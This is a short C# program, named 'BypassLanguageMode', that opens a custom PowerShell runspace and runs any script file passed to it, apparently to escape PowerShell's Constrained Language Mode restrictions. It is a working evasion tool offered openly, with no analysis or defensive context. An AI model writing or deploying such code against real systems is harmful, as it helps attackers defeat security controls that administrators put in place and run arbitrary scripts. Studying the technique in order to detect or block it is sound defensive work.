using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace BypassLanguageMode
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            string scriptFile = args[0];
            string cmd = System.IO.File.ReadAllText(scriptFile);
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
